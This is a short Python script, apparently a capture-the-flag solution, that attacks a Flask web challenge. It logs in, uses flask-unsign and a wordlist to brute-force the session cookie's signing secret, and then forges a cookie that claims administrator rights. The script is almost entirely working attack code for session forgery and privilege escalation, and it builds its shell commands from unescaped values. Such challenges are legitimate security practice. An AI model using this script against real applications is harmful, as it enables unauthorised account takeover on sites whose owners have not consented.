#! /usr/bin/env python3
import requests
import os
import threading
def grab_cookies():
    session = requests.Session()
    data = {"username": "milkz","password":"milkz"}
    session.post("http://chal.competitivecyber.club:9999/",data=data)
    cookie = session.cookies.get_dict()["session"]
    print(cookie)
    return cookie

def brute_force(cookie: str):
    key = os.popen(f"flask-unsign --wordlist brute.txt --unsign --cookie {cookie} --no-literal-eval").read()
    return key.strip().replace("b'","").replace("'","")
def sign_cookie(key: str):
    payload = "{'is_admin': True, 'uid': '830b9be9-852c-5f57-b306-712867b2da19', 'username': 'administrator'}"
    command = "flask-unsign --sign --cookie \"{{'is_admin': True, 'uid': '830b9be9-852c-5f57-b306-712867b2da19', 'username': 'administrator'}}\" --secret \'{}\'".format(key)
    print(command)
    cookie = os.popen(command).read().strip()
    return cookie

def main():
    while True:
        cookies  = grab_cookies()
        key = brute_force(cookies)
        cookie = "session="+sign_cookie(key)
        print(cookie)
        exit()

if __name__ == "__main__":
   main()

